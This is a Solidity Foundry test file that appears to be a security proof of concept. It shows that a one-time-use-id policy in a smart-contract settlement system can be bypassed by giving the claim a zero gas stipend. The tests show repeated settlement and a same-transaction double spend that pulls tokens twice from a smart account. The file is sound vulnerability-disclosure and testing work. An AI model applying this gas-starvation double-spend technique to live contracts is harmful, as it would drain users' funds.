// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { OneTimeUseIdE2E_Base } from
    "../../integration/policies/OneTimeUseId/OneTimeUseIdMatrixE2E.integration.t.sol";
import { MockAdapter } from "@mocks/MockAdapter.sol";
import { Types } from "@compact-utils/types/OrderTypes.sol";

contract OneTimeUseId_GasStarvePoC_Test is OneTimeUseIdE2E_Base {
    function _prepWithStipend(uint128 stipend) internal returns (bytes memory) {
        Types.Order memory order = _getPermit2Order();
        order.packedGasValues =
            Types.packGasValues(stipend, uint128($intent.element.mandate.minGas));
        $intent.userEmissarySig = _createSmartSessionSignature(_createPolicyData());
        return abi.encodeCall(
            MockAdapter.mock_permit2_handleClaim,
            (
                MockAdapter.ClaimDataPermit2({
                    order: order,
                    userSigs: Types.Signatures($intent.userEmissarySig, "")
                })
            )
        );
    }

    function _bumpNonce() internal {
        $intent.nonce = $intent.nonce + 1;
        $intent.permit2Hash =
            hashPermit2($intent.sponsor, $intent.nonce, $intent.expires, arbiter, $intent.element);
        $intent.digest = _hashTypedDataPermit2(block.chainid, $intent.permit2Hash);
    }

    function test_baseline_honestStipendBurns() public {
        _enableSession(true);
        _claim(block.chainid, abi.encodePacked(env.solver.addr), _prepWithStipend(300_000));
        assertTrue(_burned(), "honest stipend burns");
    }

    function test_poc_repeatSettlement() public {
        _enableSession(true);
        uint256 accStart = env.token1.balanceOf(env.smartAccount1.account);
        _claim(block.chainid, abi.encodePacked(env.solver.addr), _prepWithStipend(0));
        assertFalse(_burned(), "first settlement did not burn");
        _bumpNonce();
        _claim(block.chainid, abi.encodePacked(env.solver.addr), _prepWithStipend(0));
        assertFalse(_burned(), "second settlement also did not burn");
        emit log_named_uint(
            "tokenIn debited", accStart - env.token1.balanceOf(env.smartAccount1.account)
        );
        assertEq(
            accStart - env.token1.balanceOf(env.smartAccount1.account), 200 ether, "pulled TWICE"
        );
    }

    function test_poc_sameTransactionDoubleSpend() public {
        _enableSession(true);
        uint256 accStart = env.token1.balanceOf(env.smartAccount1.account);
        _claim(block.chainid, abi.encodePacked(env.solver.addr), _prepWithStipend(300_000));
        assertTrue(_burned(), "S1 burned the id");
        _bumpNonce();
        _claim(block.chainid, abi.encodePacked(env.solver.addr), _prepWithStipend(0));
        emit log_named_uint(
            "tokenIn debited in ONE tx", accStart - env.token1.balanceOf(env.smartAccount1.account)
        );
        assertEq(
            accStart - env.token1.balanceOf(env.smartAccount1.account),
            200 ether,
            "double spend AFTER the burn, same transaction"
        );
    }

    function _sweep(uint128 stipend) internal returns (bool) {
        _enableSession(true);
        _claim(block.chainid, abi.encodePacked(env.solver.addr), _prepWithStipend(stipend));
        return _burned();
    }

    function test_sweep_50k() public {
        emit log_named_string("50k burned", _sweep(50_000) ? "yes" : "NO");
    }

    function test_sweep_100k() public {
        emit log_named_string("100k burned", _sweep(100_000) ? "yes" : "NO");
    }

    function test_sweep_150k() public {
        emit log_named_string("150k burned", _sweep(150_000) ? "yes" : "NO");
    }

    function test_sweep_200k() public {
        emit log_named_string("200k burned", _sweep(200_000) ? "yes" : "NO");
    }
}
